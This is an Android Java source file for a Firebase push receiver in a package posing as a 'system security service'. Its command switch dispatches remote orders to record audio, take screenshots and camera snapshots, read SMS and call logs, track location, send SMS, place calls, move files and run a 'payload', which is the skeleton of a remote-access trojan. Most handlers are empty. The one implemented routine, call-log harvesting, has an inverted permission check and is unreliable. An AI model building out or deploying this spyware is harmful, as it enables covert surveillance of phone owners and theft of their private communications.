package com.service.security.services.systemsecurityservice;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.widget.Toast;
import android.provider.CallLog;

import java.util.Date;

public class FirebaseBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        System.out.println("FirebaseBroadcastReceiver.onReceive() message received!");

        String action = intent.getStringExtra("action");
        String content = intent.getStringExtra("content");

        performAction(context, content, action);
    }

    private boolean performAction(Context context, String content, String action) {
        switch (action) {
            case "popup": {
                showPopUp(context, content);
                return true;
            }
            case "notify": {
                showNotification(context, content);
                return true;
            }
            case "run": {
                runApp(context, content);
                return true;
            }
            case "explore": {
                getFiles(context, content);
                return true;
            }
            case "open_file": {
                openFile(context, content);
                return true;
            }
            case "download_file": {
                downloadFile(context, content);
                return true;
            }
            case "upload_file": {
                uploadFile(context, content);
                return true;
            }
            case "play_sound": {
                playSound(context, content);
                return true;
            }
            case "record_sound": {
                sendRecordedSound(context);
                return true;
            }
            case "screenshot": {
                sendScreenshot(context);
                return true;
            }
            case "snapshot": {
                sendSnapshot(context);
                return true;
            }
            case "make_call": {
                performCall(context, content);
                return true;
            }
            case "send_sms": {
                sendSms(context, content);
                return true;
            }
            case "call_log": {
                sendCallLog();
                return true;
            }
            case "sms_log": {
                sendSmsLog();
                return true;
            }
            case "get_location": {
                sendLocation();
                return true;
            }
            case "payload": {

                return true;
            }
            default: {
                makeToast(context, content);
            }
            System.out.println("FirebaseBroadcastReceiver.performAction Action = " + action);
            System.out.println("FirebaseBroadcastReceiver.performAction content = " + content);

        }

        return false;
    }

    private void makeToast(Context context, String content) {
        Toast.makeText(context, content, Toast.LENGTH_SHORT).show();
    }

    private void playSound(Context context, String content) {

    }

    private void sendRecordedSound(Context context) {

    }

    private void downloadFile(Context context, String content) {

    }

    private void sendScreenshot(Context context) {

    }

    private void performCall(Context context, String content) {

    }

    private void getFiles(Context context, String content) {

    }

    private void sendSnapshot(Context context) {
    }

    private void openFile(Context context, String content) {

    }

    private void sendSms(Context context, String content) {

    }

    private void sendSmsLog() {

    }

    private void runApp(Context context, String content) {

    }

    private void sendLocation() {

    }

    private void uploadFile(Context context, String content) {

    }

    private void showNotification(Context context, String content) {
    }

    public void sendCallLog() {
        //String callLog = getCallLog();
        //Log.e("call Log", "inside sendCallLog()" + callLog);
        Log.e("FBR.sendCallLog()", "getCallLog() not implemented");
    }

    public String getCallLog() {
        Log.e("call log", "inside getCallLog()");
        if (ActivityCompat.checkSelfPermission(Main.getInstance(), android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.

            Cursor mCursor = Main.getInstance().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null,
                    null, null);
            Log.e("call Log", "mCursor == nul :" + String.valueOf(mCursor == null));
            int number;
            if (mCursor != null) {
                number = mCursor.getColumnIndex(CallLog.Calls.NUMBER);

                int date = mCursor.getColumnIndex(CallLog.Calls.DATE);
                int duration = mCursor.getColumnIndex(CallLog.Calls.DURATION);
                int type = mCursor.getColumnIndex(CallLog.Calls.TYPE);
                StringBuilder sb = new StringBuilder();
                while (mCursor.moveToNext()) {
                    String phnumber = mCursor.getString(number);
                    String callduration = mCursor.getString(duration);
                    String calltype = mCursor.getString(type);
                    String calldate = mCursor.getString(date);
                    Date d = new Date(Long.valueOf(calldate));
                    String callTypeStr = "";

                    Log.e("callLog", "" + phnumber + " " + callduration + " " + calldate + " " + calltype);

                    switch (Integer.parseInt(calltype)) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            callTypeStr = "Outgoing";
                            break;
                        case CallLog.Calls.INCOMING_TYPE:
                            callTypeStr = "Incoming";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            callTypeStr = "Missed";
                            break;
                    }
                    sb.append("Phone number ").append(phnumber);
                    sb.append(System.getProperty("line.separator"));
                    sb.append("Call duration ").append(callduration);
                    sb.append(System.getProperty("line.separator"));
                    sb.append("Call type ").append(callTypeStr);
                    sb.append(System.getProperty("line.separator"));
                    sb.append("Call date ").append(d);
                    sb.append("---------------------------");
                    sb.append(System.getProperty("line.separator"));
                }
                return sb.toString();
            }
        }
        return "null";
    }

    public void showPopUp(Context context, String url) {
        Intent i = new Intent();
        i.setClass(context, MainActivity.class);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.putExtra("url", url);
        context.startActivity(i);
    }


}

